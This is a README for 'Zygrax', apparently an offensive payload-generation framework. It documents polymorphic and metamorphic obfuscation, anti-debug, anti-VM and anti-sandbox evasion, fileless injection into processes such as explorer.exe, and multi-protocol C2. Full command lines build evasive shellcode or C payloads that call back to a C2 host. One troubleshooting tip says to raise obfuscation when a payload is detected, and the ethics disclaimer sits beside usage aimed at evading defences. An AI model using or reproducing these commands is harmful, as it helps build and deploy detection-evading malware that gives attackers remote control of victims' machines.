# 
<div align="center">
<p style="font-size: 25px;"><strong><b>Zygrax Framework</b></strong></p>
</div>
<div align="center">
  <img src="zygrax.png" alt="Zygrax Logo" style="border-radius: 15px; border: 2px solid #4A90E2; padding: 10px;" width="250" height="250">
  
  ![Version](https://img.shields.io/badge/Version-3.2-blue.svg)
  ![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)
  ![Language](https://img.shields.io/badge/Language-C-blue.svg)
  ![License](https://img.shields.io/badge/License-MIT-green.svg)
  ![Research](https://img.shields.io/badge/Purpose-Security%20Research-red.svg)

  ![Advanced](https://img.shields.io/badge/Advanced-Polymorphic-orange.svg)
  ![Stealth](https://img.shields.io/badge/Stealth-Fileless%20Execution-brightgreen.svg)
  ![Evasion](https://img.shields.io/badge/Evasion-Anti%20Analysis-yellow.svg)
  ![Mutation](https://img.shields.io/badge/Mutation-Genetic%20Engine-purple.svg)
  ![Virtualization](https://img.shields.io/badge/Virtualization-VM%20Protected-9cf.svg)

</div>

## Overview

Zygrax is an advanced payload generation framework designed for security research and penetration testing. It incorporates cutting-edge evasion techniques, code transformation engines, and multiple deployment methods to create sophisticated payloads for authorized security assessments.

## Key Features

### Core Capabilities
- **Multi-Platform Support**: Windows, Linux, macOS
- **Multi-Architecture**: x86, x64, ARM64
- **Multiple Payload Types**: Shellcode, C source, Assembly
- **Advanced C2 Communication**: HTTPS, DNS, ICMP, WebSocket protocols

### Advanced Obfuscation
- **Polymorphic Engine**: Real-time code structure transformation
- **Metamorphic Engine**: Self-modifying payload generation
- **Code Virtualization**: VM-based execution protection
- **Genetic Mutation**: Evolutionary algorithm-based code mutation
- **Multi-layer Encryption**: AES-256 payload protection

### Anti-Analysis Evasion
- **Anti-Debugging**: PTRACE detection, hardware breakpoint detection
- **Anti-VM**: CPUID-based virtualization detection
- **Anti-Sandbox**: Environment-aware execution paths
- **Timing Analysis**: Execution timing manipulation

### Fileless Deployment
- **Reflective DLL Injection**: Memory-only DLL loading
- **Process Hollowing**: Legitimate process replacement
- **APC Injection**: Asynchronous procedure call injection
- **Memory-only Execution**: No disk footprint

## Compilation

### Prerequisites
```bash
# Install required libraries
sudo apt-get install build-essential libssl-dev  # Ubuntu/Debian
sudo yum install gcc openssl-devel               # CentOS/RHEL
brew install openssl                             # macOS
```

### Building Zygrax
```bash
# Clone and compile
git clone https://github.com/Ar1sto/zygrax.git
cd zygrax
gcc -o zygrax zygrax.c -lssl -lcrypto -O2
```

### Verification
```bash
# Verify compilation
./zygrax --help
```

## Usage Guide

### Basic Usage
```bash
# Interactive mode (recommended for beginners)
./zygrax --interactive

# Advanced mode (all features enabled)
./zygrax --advanced --interactive

# Quick shellcode generation
./zygrax --type shellcode --output payload.bin --platform windows --arch x64
```

### Complete Parameter Reference

#### Payload Configuration
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--type` | Payload type | `shellcode`, `c`, `asm` | Required |
| `--output` | Output filename | Any valid filename | Required |
| `--platform` | Target platform | `windows`, `linux`, `macos` | Current OS |
| `--arch` | Target architecture | `x86`, `x64`, `arm64` | `x64` |

#### Obfuscation Engine
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--obfuscate` | Obfuscation level | `0-5` | `2` |
| `--polymorphic` | Enable polymorphic engine | None (flag) | Disabled |
| `--metamorphic` | Enable metamorphic engine | None (flag) | Disabled |
| `--virtualization` | Enable code virtualization | None (flag) | Disabled |
| `--vm-type` | Virtual machine type | `register`, `stack`, `hybrid` | `register` |

#### Mutation Engine
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--mutation` | Enable genetic mutation | None (flag) | Disabled |
| `--mutation-rate` | Mutation rate percentage | `1-100` | `5` |
| `--generations` | Number of generations | `1-100` | `3` |
| `--algorithm` | Mutation algorithm | `genetic`, `random`, `evolutionary` | `genetic` |

#### Anti-Analysis
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--anti-debug` | Anti-debugging techniques | None (flag) | Disabled |
| `--anti-vm` | Anti-virtualization detection | None (flag) | Disabled |
| `--anti-sandbox` | Anti-sandbox evasion | None (flag) | Disabled |
| `--anti-timing` | Timing-based detection | None (flag) | Disabled |

#### Fileless Deployment
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--fileless` | Enable fileless techniques | None (flag) | Disabled |
| `--injection` | Injection method | `reflect`, `hollow`, `apc` | `reflect` |
| `--target` | Target process | Process name | `explorer.exe` |

#### C2 Configuration
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--c2-server` | C2 server address | IP or hostname | `127.0.0.1` |
| `--c2-port` | C2 server port | `1-65535` | `443` |
| `--c2-protocol` | C2 protocol | `http`, `https`, `dns`, `tcp`, `icmp`, `websocket` | `https` |
| `--auth-key` | Authentication key | Any string | Generated |

#### Compiler Options
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--compiler` | Compiler selection | `gcc`, `clang`, `mingw` | `gcc` |
| `--flags` | Compiler flags | GCC/Clang flags | `-O2` |
| `--optimize` | Optimization level | `0-3` | `2` |
| `--strip` | Strip binary symbols | None (flag) | Disabled |
| `--pie` | Enable PIE | None (flag) | Disabled |

#### General Options
| Parameter | Description | Values | Default |
|-----------|-------------|---------|---------|
| `--help` | Show help message | None (flag) | N/A |
| `--interactive` | Interactive mode | None (flag) | Disabled |
| `--advanced` | Enable all features | None (flag) | Disabled |
| `--encrypt` | Enable payload encryption | None (flag) | Disabled |

## Technical Implementation Details

### Polymorphic Engine
The polymorphic engine implements real-time code transformation through:
- Instruction substitution and register reassignment
- Code transposition and control flow alteration
- Dynamic API hashing and resolution
- Multi-layer obfuscation with configurable intensity

### Metamorphic Engine
Metamorphic capabilities include:
- Self-modifying code generation
- Structural code randomization
- Decoder stubs for runtime decryption
- Environment-aware code generation

### Virtual Machine Protection
The virtualization layer provides:
- Register-based virtual machine architecture
- Custom instruction set interpretation
- Bytecode translation and execution
- Anti-analysis through code interpretation

### Genetic Mutation
Evolutionary algorithms feature:
- Multi-generation mutation cycles
- Crossover and elitism mechanisms
- Adaptive mutation rates
- Multiple mutation strategies

## Advanced Usage Examples

### Advanced Evasion Payload
```bash
./zygrax --type shellcode --output advanced.bin --platform windows --arch x64 \
         --polymorphic --metamorphic --virtualization --vm-type hybrid \
         --mutation --mutation-rate 15 --generations 5 --algorithm evolutionary \
         --anti-debug --anti-vm --anti-sandbox --anti-timing \
         --fileless --injection reflect --target explorer.exe \
         --encrypt --c2-protocol dns --c2-server your-c2-server.com
```

### Stealth C Payload
```bash
./zygrax --type c --output stealth.c --platform linux --arch x64 \
         --obfuscate 5 --polymorphic --anti-debug --anti-vm \
         --compiler clang --optimize 3 --strip --pie \
         --c2-protocol https --c2-server 192.168.1.100 --c2-port 443
```

### Research Configuration
```bash
./zygrax --advanced --interactive
```

## Output Examples

### Generated C Code Structure
```c
// Anti-analysis checks
void AntiDebugCheck() {
    if (IsDebugged()) {
        exit(1);
    }
}

void AntiVMCheck() {
    if (IsVM()) {
        exit(1);
    }
}

// Fileless execution capability
BOOL ReflectiveLoader(LPVOID lpPayload) {
    // Memory-only DLL loading implementation
}

// Encrypted communication
void SecureC2Communication() {
    // AES-256 encrypted channel
}
```

### Compilation Instructions
For C payloads, Zygrax provides optimized compilation commands:
```bash
# Windows cross-compilation
x86_64-w64-mingw32-gcc -O3 -s -fPIE -pie -o payload.exe payload.c

# Linux compilation
gcc -O3 -s -fPIE -pie -fstack-protector-strong -o payload payload.c
```

## Ethical Usage and Legal Notice

### Intended Purpose
Zygrax is exclusively designed for:
- Authorized penetration testing
- Security research and education
- Red team exercises with proper authorization
- Academic security studies
- Defensive security tool development

### Strictly Prohibited Uses
- Unauthorized security testing
- Malicious cyber activities
- Network intrusion without permission
- Any illegal or unethical activities

### Legal Compliance
Users must ensure:
- Proper authorization for all testing activities
- Compliance with local and international laws
- Respect for privacy and data protection regulations
- Adherence to responsible disclosure practices

### Security Research Focus
Zygrax contributes to cybersecurity by:
- Advancing evasion technique understanding
- Improving defensive security measures
- Enhancing threat intelligence capabilities
- Supporting security education and training

## Architecture Support

### Supported Platforms
- **Windows**: 7/8/10/11, Server 2012-2022
- **Linux**: Kernel 3.0+, most distributions
- **macOS**: 10.12+ (Intel and Apple Silicon)

### Processor Architectures
- **x86**: 32-bit Intel/AMD compatibility
- **x64**: 64-bit Intel/AMD optimization
- **ARM64**: Apple Silicon and ARM server support

## Dependencies and Requirements

### Required Libraries
- OpenSSL 1.1.1+ (encryption functions)
- Standard C library (stdlib, string, time)
- Platform-specific APIs (Windows API, POSIX)

### Build Requirements
- GCC 7.0+ or Clang 6.0+
- GNU Make or equivalent
- OpenSSL development headers

## Troubleshooting

### Common Issues
1. **OpenSSL not found**: Install libssl-dev package
2. **Compilation errors**: Ensure GCC and development tools are installed
3. **Permission denied**: Check file permissions and anti-virus software
4. **Payload detection**: Adjust obfuscation levels and techniques

### Performance Considerations
- Higher obfuscation levels increase generation time
- Complex mutations may affect payload size
- Virtualization adds runtime overhead
- Choose features based on operational requirements

## Contributing and Development

### Research Collaboration
Zygrax welcomes contributions in:
- New evasion techniques
- Anti-analysis methods
- Performance optimization
- Additional platform support

---

<div align="center">
  
**Zygrax Framework** - *Advanced Payload Generation for Security Research*

**Disclaimer**: This tool should only be used for legitimate security research and authorized testing activities. Users are responsible for ensuring they have proper authorization before using this tool in any environment.

</div>